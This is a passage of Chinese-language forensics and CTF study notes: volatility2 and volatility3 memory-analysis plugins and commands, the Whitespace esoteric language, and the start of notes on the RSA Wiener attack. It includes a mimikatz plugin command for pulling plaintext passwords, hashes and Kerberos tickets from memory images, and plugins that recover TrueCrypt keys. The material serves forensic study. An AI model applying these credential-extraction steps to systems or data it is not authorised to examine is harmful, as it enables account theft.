</tr>
<tr class="odd">
<td>pstree</td>
<td>将进程列表打印为树</td>
</tr>
<tr class="even">
<td>psxview</td>
<td>使用各种进程列表查找隐藏进程</td>
</tr>
<tr class="odd">
<td>qemuinfo</td>
<td>转储 Qemu 信息</td>
</tr>
<tr class="even">
<td>raw2dmp</td>
<td>将物理内存样本转换为 windbg 崩溃转储</td>
</tr>
<tr class="odd">
<td>screenshot</td>
<td>基于 GDI windows 保存伪屏幕截图</td>
</tr>
<tr class="even">
<td>servicediff</td>
<td>列出 Windows 服务（类似于 Plugx）</td>
</tr>
<tr class="odd">
<td>sessions</td>
<td>列出关于
<code>_MM_SESSION_SPACE</code>（用户登录会话）的详细信息</td>
</tr>
<tr class="even">
<td>shellbags</td>
<td>打印 ShellBags 信息</td>
</tr>
<tr class="odd">
<td>shimcache</td>
<td>解析应用程序兼容性 Shim 缓存注册表项</td>
</tr>
<tr class="even">
<td>shutdowntime</td>
<td>从注册表中打印机器的 ShutdownTime</td>
</tr>
<tr class="odd">
<td>sockets</td>
<td>打印打开的套接字列表</td>
</tr>
<tr class="even">
<td>sockscan</td>
<td>用于 tcp 套接字对象的池扫描器</td>
</tr>
<tr class="odd">
<td>ssdt</td>
<td>显示 SSDT 条目</td>
</tr>
<tr class="even">
<td>strings</td>
<td>将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）</td>
</tr>
<tr class="odd">
<td>svcscan</td>
<td>扫描 Windows 服务</td>
</tr>
<tr class="even">
<td>symlinkscan</td>
<td>用于符号链接对象的池扫描器</td>
</tr>
<tr class="odd">
<td>thrdscan</td>
<td>线程对象的池扫描器</td>
</tr>
<tr class="even">
<td>threads</td>
<td>调查 <code>_ETHREAD</code> 和 <code>_KTHREAD</code></td>
</tr>
<tr class="odd">
<td>timeliner</td>
<td>从内存计时器中的各种工件创建时间线</td>
</tr>
<tr class="even">
<td>timers</td>
<td>打印内核计时器和相关的模块 DPC</td>
</tr>
<tr class="odd">
<td>truecryptmaster</td>
<td>恢复 TrueCrypt 7.1a 主密钥</td>
</tr>
<tr class="even">
<td>truecryptpassphrase</td>
<td>TrueCrypt 缓存密码查找器</td>
</tr>
<tr class="odd">
<td>truecryptsummary</td>
<td>TrueCrypt 摘要</td>
</tr>
<tr class="even">
<td>unloadedmodules</td>
<td>打印未加载模块的列表</td>
</tr>
<tr class="odd">
<td>userassist</td>
<td>打印 USER 注册表键值和信息</td>
</tr>
<tr class="even">
<td>userhandles</td>
<td>转出 USER 句柄表</td>
</tr>
<tr class="odd">
<td>vaddump</td>
<td>转储 VAD 信息到一个文件中</td>
</tr>
<tr class="even">
<td>vadinfo</td>
<td>转储 VAD 信息</td>
</tr>
<tr class="odd">
<td>vadtree</td>
<td>遍历 VAD 树并以树格式显示</td>
</tr>
<tr class="even">
<td>vadwalk</td>
<td>遍历 VAD 树</td>
</tr>
<tr class="odd">
<td>vboxinfo</td>
<td>转储 virtualbox 信息</td>
</tr>
<tr class="even">
<td>verinfo</td>
<td>从 PE 映像中打印版本信息</td>
</tr>
<tr class="odd">
<td>vmwareinfo</td>
<td>转储 VMware VMSS/VMSN 信息</td>
</tr>
<tr class="even">
<td>volshell</td>
<td>内存映像中的 Shell</td>
</tr>
<tr class="odd">
<td>win10cookie</td>
<td>查找 Windows 10 窗口的 <code>ObHeaderCookie</code> 值</td>
</tr>
<tr class="even">
<td>windows</td>
<td>打印桌面 Windows（详细详细信息）</td>
</tr>
<tr class="odd">
<td>wintree</td>
<td>打印 Z-Order 桌面Windows 树</td>
</tr>
<tr class="even">
<td>wndscan</td>
<td>用于窗口站的池扫描程序</td>
</tr>
<tr class="odd">
<td>yarascan</td>
<td>使用 Yara 签名扫描进程或内核内存</td>
</tr>
</tbody>
</table>
<h1 id="volatility2-插件">volatility2 插件</h1>
<p>实际上所有 volatility2
的功能都是由插件实现的，我们可以自主安装他人所写的插件或者是自己写插件脚本。</p>
<p>无论是哪种，只需要将插件脚本拖入 <code>plugins/</code>
文件下即可（另一个可能的路径为
<code>volatility/plugins/</code>），且支持文件夹分类（实际上只要在该目录下的所有文件都会遍历加载）。</p>
<h2 id="mimikatz">mimikatz</h2>
<p>mimikatz 是一个可以从内存中提取明文密码、哈希、PIN 码和 kerberos
票证的软件，在 volatility2 中有专门的插件替代了繁琐的操作。</p>
<p>如果不使用插件，我们需要首先从内存镜像中转储 <code>lsass.exe</code>
的内存文件为 <code>lsass.dmp</code> 后，用 mimikatz 加载并读取数据。</p>
<p>我们可以在
https://github.com/RealityNet/hotoloti/tree/master/volatility 中获取
<code>mimikatz.py</code>，将其添加到 <code>plugins/</code>
文件夹下即可使用。</p>
<p>使用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f file.raw mimikatz</span><br></pre></td></tr></table></figure>
<p>一键提取出目标内存镜像中的用户名和密码。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
        <tag>volatility</tag>
      </tags>
  </entry>
  <entry>
    <title>volatility3 使用笔记</title>
    <url>//vol3-note.html</url>
    <content><![CDATA[<h1 id="volatility3-安装">volatility3 安装</h1>
<p><strong>volatility3 需要 Python 3.6.0 或更高版本。</strong></p>
<p>进入 https://github.com/volatilityfoundation/volatility3/releases
选择<code>volatility3-2.0.0-py3-none-any.whl</code>进行下载</p>
<figure>
<img src="/vol3-note/image-20220204224548796.png" alt="image-20220204224548796">
<figcaption aria-hidden="true">image-20220204224548796</figcaption>
</figure>
<p>通过以下指令进行自动化安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 wheel volatility3-2.0.0-py3-none-any.whl</span><br></pre></td></tr></table></figure>
<p>若安装失败可直接下载源码后直接使用，但需要手动调用脚本
<code>vol.py</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 vol.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以通过以下指令达到与 <code>.whl</code> 安装同样的效果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 setup.py build</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果需要使用 volatility3 最基本功能，请将以下内容保存为
<code>r.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># These packages are required for core functionality.</span></span><br><span class="line">pefile&gt;=2017.8.1 <span class="comment">#foo</span></span><br></pre></td></tr></table></figure>
<p>如果需要使用 volatility3 完整功能，请将以下内容保存为
<code>r.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The following packages are required for core functionality.</span></span><br><span class="line">pefile&gt;=2017.8.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following packages are optional.</span></span><br><span class="line"><span class="comment"># If certain packages are not necessary, place a comment (#) at the start of the line.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required for the yara plugins</span></span><br><span class="line">yara-python&gt;=3.8.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required for several plugins that perform malware analysis and disassemble code.</span></span><br><span class="line"><span class="comment"># It can also improve accuracy of Windows 8 and later memory samples.</span></span><br><span class="line">capstone&gt;=3.0.5</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required by plugins that decrypt passwords, password hashes, etc.</span></span><br><span class="line">pycryptodome</span><br><span class="line"></span><br><span class="line"><span class="comment"># This can improve error messages regarding improperly configured ISF files.</span></span><br><span class="line">jsonschema&gt;=2.3.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required for memory acquisition via leechcore/pcileech.</span></span><br><span class="line">leechcorepyc&gt;=2.4.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required for analyzing Linux samples compressed using AVMLs native</span></span><br><span class="line"><span class="comment"># compression format.  It is not required for AVML&#x27;s standard LiME compression.</span></span><br><span class="line">python-snappy==0.6.0</span><br></pre></td></tr></table></figure>
<p>然后运行以下指令安装 volatility3 所需依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install -r r.txt</span><br></pre></td></tr></table></figure>
<h1 id="volatility3-使用">volatility3 使用</h1>
<h2 id="使用">使用</h2>
<p>通过 <code>-h</code> 指令获取帮助</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -h</span><br></pre></td></tr></table></figure>
<figure>
<img src="/vol3-note/vol3help.png" alt="vol3help">
<figcaption aria-hidden="true">vol3help</figcaption>
</figure>
<p>同样地，可以对插件使用 <code>-h</code> 指令获取插件帮助</p>
<figure>
<img src="/vol3-note/layerwritehelp.png" alt="layerwritehelp">
<figcaption aria-hidden="true">layerwritehelp</figcaption>
</figure>
<h2 id="插件">插件</h2>
<p>使用对应 linux / mac / windows 插件之前，请先下载对应的符号表
(最好下载所有的符号包)：</p>
<ul>
<li><p>https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip</p></li>
<li><p>https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip</p></li>
<li><p>https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip</p></li>
</ul>
<p>并将其解压在 <code>./volatility/symbols/</code> 目录下</p>
<figure>
<img src="/vol3-note/symbols.png" alt="symbols">
<figcaption aria-hidden="true">symbols</figcaption>
</figure>
<blockquote>
<p>以下，部分插件可能出现不存在或者更名的情况，我并未使用到的功能并不会及时更新</p>
</blockquote>
<table>
<colgroup>
<col style="width: 36%">
<col style="width: 63%">
</colgroup>
<thead>
<tr class="header">
<th>插件名</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>layerwriter</code></td>
<td>列出内存镜像 platform 信息，分割 layers</td>
</tr>
<tr class="even">
<td><code>linux.bash</code></td>
<td>从内存中恢复 bash 命令历史记录</td>
</tr>
<tr class="odd">
<td><code>linux.check_afinfo</code></td>
<td>验证网络协议的操作功能指针</td>
</tr>
<tr class="even">
<td><code>linux.check_syscall</code></td>
<td>检查系统调用表中的挂钩</td>
</tr>
<tr class="odd">
<td><code>linux.elfs</code></td>
<td>列出所有进程的所有内存映射ELF文件</td>
</tr>
<tr class="even">
<td><code>linux.lsmod</code></td>
<td>列出加载的内核模块</td>
</tr>
<tr class="odd">
<td><code>linux.lsof</code></td>
<td>列出所有进程的所有内存映射</td>
</tr>
<tr class="even">
<td><code>linux.malfind</code></td>
<td>列出可能包含注入代码的进程内存范围</td>
</tr>
<tr class="odd">
<td><code>linux.proc</code></td>
<td>列出所有进程的所有内存映射</td>
</tr>
<tr class="even">
<td><code>linux.pslist</code></td>
<td>列出 linux 内存映像中存在的进程</td>
</tr>
<tr class="odd">
<td><code>linux.pstree</code></td>
<td>列出进程树</td>
</tr>
<tr class="even">
<td><code>mac.bash</code></td>
<td>从内存中恢复 bash 命令历史记录</td>
</tr>
<tr class="odd">
<td><code>mac.check_syscall</code></td>
<td>检查系统调用表中的挂钩</td>
</tr>
<tr class="even">
<td><code>mac.check_sysctl</code></td>
<td>检查 sysctl 处理程序的挂钩</td>
</tr>
<tr class="odd">
<td><code>mac.check_trap_table</code></td>
<td>检查 trap 表中的挂钩</td>
</tr>
<tr class="even">
<td><code>mac.ifconfig</code></td>
<td>列出网卡信息</td>
</tr>
<tr class="odd">
<td><code>mac.lsmod</code></td>
<td>列出加载的内核模块</td>
</tr>
<tr class="even">
<td><code>mac.lsof</code></td>
<td>列出所有进程的所有内存映射</td>
</tr>
<tr class="odd">
<td><code>mac.malfind</code></td>
<td>列出可能包含注入代码的进程内存范围</td>
</tr>
<tr class="even">
<td><code>mac.netstat</code></td>
<td>列出所有进程的所有网络连接</td>
</tr>
<tr class="odd">
<td><code>mac.psaux</code></td>
<td>恢复程序命令行参数</td>
</tr>
<tr class="even">
<td><code>mac.pslist</code></td>
<td>列出 mac 内存映像中存在的进程</td>
</tr>
<tr class="odd">
<td><code>mac.pstree</code></td>
<td>列出进程树</td>
</tr>
<tr class="even">
<td><code>mac.tasks</code></td>
<td>列出 mac 内存映像中存在的进程</td>
</tr>
<tr class="odd">
<td><code>windows.info</code></td>
<td>显示正在分析的内存样本的 OS 和内核详细信息</td>
</tr>
<tr class="even">
<td><code>windows.callbacks</code></td>
<td>列出内核回调和通知例程</td>
</tr>
<tr class="odd">
<td><code>windows.cmdline</code></td>
<td>列出进程命令行参数</td>
</tr>
<tr class="even">
<td><code>windows.dlldump</code></td>
<td>将进程内存范围 DLL 转储</td>
</tr>
<tr class="odd">
<td><code>windows.dlllist</code></td>
<td>列出 Windows 内存映像中已加载的 dll 模块</td>
</tr>
<tr class="even">
<td><code>windows.driverirp</code></td>
<td>在 Windows 内存映像中列出驱动程序的 IRP</td>
</tr>
<tr class="odd">
<td><code>windows.driverscan</code></td>
<td>扫描 Windows 内存映像中存在的驱动程序</td>
</tr>
<tr class="even">
<td><code>windows.filescan</code></td>
<td>扫描 Windows 内存映像中存在的文件对象</td>
</tr>
<tr class="odd">
<td><code>windows.handles</code></td>
<td>列出进程打开的句柄</td>
</tr>
<tr class="even">
<td><code>windows.malfind</code></td>
<td>列出可能包含注入代码的进程内存范围</td>
</tr>
<tr class="odd">
<td><code>windows.moddump</code></td>
<td>转储内核模块</td>
</tr>
<tr class="even">
<td><code>windows.modscan</code></td>
<td>扫描 Windows 内存映像中存在的模块</td>
</tr>
<tr class="odd">
<td><code>windows.mutantscan</code></td>
<td>扫描 Windows 内存映像中存在的互斥锁</td>
</tr>
<tr class="even">
<td><code>windows.pslist</code></td>
<td>列出 Windows 内存映像中存在的进程，转储处理可执行映像</td>
</tr>
<tr class="odd">
<td><code>windows.psscan</code></td>
<td>扫描 Windows 内存映像中存在的进程</td>
</tr>
<tr class="even">
<td><code>windows.pstree</code></td>
<td>列出进程树</td>
</tr>
<tr class="odd">
<td><code>windows.registry.certificates</code></td>
<td>列出注册表中存储的证书</td>
</tr>
<tr class="even">
<td><code>windows.registry.hivelist</code></td>
<td>列出内存映像中存在的注册表配置单元</td>
</tr>
<tr class="odd">
<td><code>windows.registry.hivescan</code></td>
<td>扫描 Windows 内存映像中存在的注册表配置单元</td>
</tr>
<tr class="even">
<td><code>windows.registry.printkey</code></td>
<td>在配置单元或特定键值下列出注册表项</td>
</tr>
<tr class="odd">
<td><code>windows.registry.userassist</code></td>
<td>打印用户助手注册表项和信息</td>
</tr>
<tr class="even">
<td><code>windows.ssdt</code></td>
<td>列出系统调用表</td>
</tr>
<tr class="odd">
<td><code>windows.strings</code></td>
<td>读取字符串命令的输出，并指示每个字符串属于哪个进程</td>
</tr>
<tr class="even">
<td><code>windows.svcscan</code></td>
<td>扫描 Windows 服务</td>
</tr>
<tr class="odd">
<td><code>windows.symlinkscan</code></td>
<td>扫描 Windows 内存映像中存在的链接</td>
</tr>
</tbody>
</table>
<h2 id="操作">操作</h2>
<h3 id="查看映像信息">查看映像信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.info</span><br></pre></td></tr></table></figure>
<h3 id="查看映像进程">查看映像进程</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.pslist</span><br><span class="line">vol.exe -f xxx.raw windows.psscan</span><br><span class="line">vol.exe -f xxx.raw windows.pstree</span><br></pre></td></tr></table></figure>
<p><strong>查看指定 pid 的进程</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.pslist --pid 1234</span><br></pre></td></tr></table></figure>
<h3 id="进程转储">进程转储</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.pslist --pid 1234 --dump</span><br></pre></td></tr></table></figure>
<h3 id="内存转储">内存转储</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.memmap --pid 1234 --dump</span><br></pre></td></tr></table></figure>
<h3 id="查看句柄">查看句柄</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.handles</span><br><span class="line">vol.exe -f xxx.raw windows.handles --pid 1234</span><br></pre></td></tr></table></figure>
<h3 id="查看-dll">查看 DLL</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.dlllist</span><br><span class="line">vol.exe -f xxx.raw windows.dlllist --pid 1234</span><br></pre></td></tr></table></figure>
<h3 id="dll-转储">DLL 转储</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.dlllist --pid 1234 --dump</span><br></pre></td></tr></table></figure>
<h3 id="查看命令行">查看命令行</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.cmdline</span><br><span class="line">vol.exe -f xxx.raw windows.cmdline --pid 1234</span><br></pre></td></tr></table></figure>
<h3 id="查看网络端口">查看网络端口</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.netscan</span><br></pre></td></tr></table></figure>
<p><strong>查看完整的结果，但可能包含垃圾信息和虚假信息
(谨慎使用)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.netscan --include-corrupt</span><br></pre></td></tr></table></figure>
<h3 id="查看注册表信息">查看注册表信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.hivescan</span><br><span class="line">vol.exe -f xxx.raw windows.registry.hivelist</span><br></pre></td></tr></table></figure>
<p><strong>查看指定过滤器 (文件夹) 下的注册表信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.hivelist --filter FILTER</span><br></pre></td></tr></table></figure>
<h3 id="注册表信息转储">注册表信息转储</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.hivelist --filter FILTER --dump</span><br></pre></td></tr></table></figure>
<h3 id="查看注册表键值对">查看注册表键值对</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.printkey</span><br></pre></td></tr></table></figure>
<p><strong>查看指定过滤器 (文件夹) 下的注册表信息，但需要
<code>hivelist</code> 提供的 <code>offset</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.printkey --offset OFFSET</span><br></pre></td></tr></table></figure>
<p><strong>查看指定键下的注册表值</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.printkey --key KEY</span><br></pre></td></tr></table></figure>
<p><strong>打印所有键的信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.registry.printkey --recurse</span><br></pre></td></tr></table></figure>
<h3 id="查看文件信息">查看文件信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.filescan</span><br></pre></td></tr></table></figure>
<blockquote>
<p>建议通过 powershell 的 Select-String 或者 bash 的 grep
进行搜索，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.filescan | grep <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">vol.exe <span class="operator">-f</span> xxx.raw windows.filescan | <span class="built_in">Select-String</span> <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="文件转储">文件转储</h3>
<p><strong>需要 <code>pslist</code> 提供的 <code>pid</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.dumpfiles --pid 1234</span><br></pre></td></tr></table></figure>
<p><strong>(推荐) 需要 <code>filescan</code> 提供的 <code>offset</code>
(一般来说为 <code>physaddr</code>) </strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.dumpfiles --virtaddr 0xee1122</span><br><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.dumpfiles --physaddr 0xee1122</span><br></pre></td></tr></table></figure>
<h3 id="查找恶意注入代码">查找恶意注入代码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -f xxx.raw windows.malfind</span><br><span class="line">vol.exe -f xxx.raw windows.malfind --pid 1234</span><br></pre></td></tr></table></figure>
<p><strong>恶意注入代码转储</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.exe -o ./outputdir/ -f xxx.raw windows.malfind --pid 1234 --dump</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>volatility</tag>
      </tags>
  </entry>
  <entry>
    <title>whitespace 编程语言</title>
    <url>//whitespace-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>WhiteSpace
是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统会被当做注释对待。</p>
<p>它本身是个指令式、基于堆栈的语言。其程式运行在上的虚拟机器均有一个堆栈（Stack）和堆（Heap）。程序员可自由将整数推进堆栈中（只可以是整数，因为暂时并无浮点数或实数工具），同时也可以通过堆作为变量和数据结构的暂存区。</p>
<p>借助这种语言，可以在满篇空白的代码中插入一篇文章，从而在看起来完全无关的文章中隐藏一段代码。</p>
<h1 id="语法">语法</h1>
<p>命令由一系列空格、制表位和换行符组成。所有其他字符都被忽略，因此可用于注释。例如，tab-space-space-space
执行堆栈顶部两个元素的算术加法。</p>
<p>命令的前一部分将被翻译为指令修改参数（IMP），IMP
后面所跟随的是操作。</p>
<p>IMP 指令集如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">IMP</th>
<th style="text-align: center;">相应指令</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;">栈操作</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;">算术</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;">堆操作</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;">指令控制</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][LF]</code></td>
<td style="text-align: center;">I/O</td>
</tr>
</tbody>
</table>
<p>IMP 所对应的操作集如下：</p>
<table>
<colgroup>
<col style="width: 18%">
<col style="width: 21%">
<col style="width: 5%">
<col style="width: 54%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">IMP</th>
<th style="text-align: center;">命令</th>
<th style="text-align: center;">参数</th>
<th style="text-align: center;">Meaning</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;">数字</td>
<td style="text-align: center;">将数字压入栈 (push)</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[LF][Space]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">复制栈顶</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;">数字</td>
<td style="text-align: center;">拷贝栈中的第n个（n由参数给出）数据到栈顶</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[LF][Tab]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">交换栈顶的两个值</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[LF][LF]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">丢弃栈顶</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;"><code>[Tab][LF]</code></td>
<td style="text-align: center;">数字</td>
<td style="text-align: center;">保留栈顶的同时丢弃n个数据</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;"><code>[Space][Space]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">加法</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;"><code>[Space][Tab]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">减法</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;"><code>[Space][LF]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">乘法</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">除法</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">求模</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;"><code>[Space]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">保存到堆</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;"><code>[Tab]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">从堆中取出数据</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Space][Space]</code></td>
<td style="text-align: center;">标签</td>
<td style="text-align: center;">在该处设定一个跳转标签</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Space][Tab]</code></td>
<td style="text-align: center;">标签</td>
<td style="text-align: center;">调用子程序 (call)</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Space][LF]</code></td>
<td style="text-align: center;">标签</td>
<td style="text-align: center;">跳转标签 (goto)</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;">标签</td>
<td style="text-align: center;">如果栈顶为0则跳转标签 (jz)</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;">标签</td>
<td style="text-align: center;">如果栈顶不为0则跳转标签 (jnz)</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[Tab][LF]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">结束子程序 (retn)</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>[LF]</code></td>
<td style="text-align: center;"><code>[LF][LF]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">结束程序 (exit)</td>
</tr>
<tr class="odd">
<td style="text-align: center;">[<code>Tab][LF]</code></td>
<td style="text-align: center;"><code>[Space</code>][Space]</td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">输出栈顶字符 (printc)</td>
</tr>
<tr class="even">
<td style="text-align: center;">[<code>Tab][LF]</code></td>
<td style="text-align: center;"><code>[Space</code>][Tab]</td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">输出栈顶数字 (printn)</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>[Tab][LF]</code></td>
<td style="text-align: center;"><code>[Tab][Space]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">读取字符放置栈顶</td>
</tr>
<tr class="even">
<td style="text-align: center;">[<code>Tab][LF]</code></td>
<td style="text-align: center;"><code>[Tab][Tab]</code></td>
<td style="text-align: center;">-</td>
<td style="text-align: center;">读取数字放置栈顶</td>
</tr>
</tbody>
</table>
<h2 id="数字">数字</h2>
<p>数字由空格 (0) 和制表符 (1)
组成，并以换行符终止。数字中的第一个空格/制表符表示数字的符号，如果是空格，则数字为正，如果是制表符，则数字为负。其余的尾随空格和制表符代表二进制数的其余部分。</p>
<h2 id="标签">标签</h2>
<p>标签只是以 <code>[LF]</code>
结尾的空格和制表符列表。只有一个全局命名空间，因此所有标签都必须是唯一的。</p>
<h1 id="编辑和运行">编辑和运行</h1>
<p>我们可以在 <a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a>
中对 whitespace 进行编辑和运行，同时有着许多示例代码可供参考。</p>
<p>在运行的时候，该网站 IDE 可以查看翻译的伪汇编代码（whitespace
虚拟机字节码），并且可以时刻中断来查看堆栈情况，方便调试程序和观察代码运行。</p>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>wiener attack 笔记</title>
    <url>//wiener-attack.html</url>
    <content><![CDATA[<h1 id="维纳攻击-wiener-attack">维纳攻击 (wiener attack)</h1>
<h2 id="普通维纳攻击">普通维纳攻击</h2>
<h3 id="连分数">连分数</h3>
<p>一个简单的表达式 <span class="math inline">\(x=a_0\)</span>，对其进行连分数展开应该是这样的：
<span class="math display">\[
x=a_0+\frac{1}{a_1+\frac{1}{a_2+\frac{1}{a_3+\cdots}}}
\]</span> 其中 <span class="math inline">\(a_i\)</span>
我们称作<strong>商(quotient)</strong>。</p>
<p>一般我们将连分数简记为 <span class="math display">\[
x=[a_0,a_1,a_2,\cdots,a_n]
\]</span> 而一个有理数（无理数）具有有限（无限）的连分数展开式。</p>
<p>一些简单的例子是： <span class="math display">\[
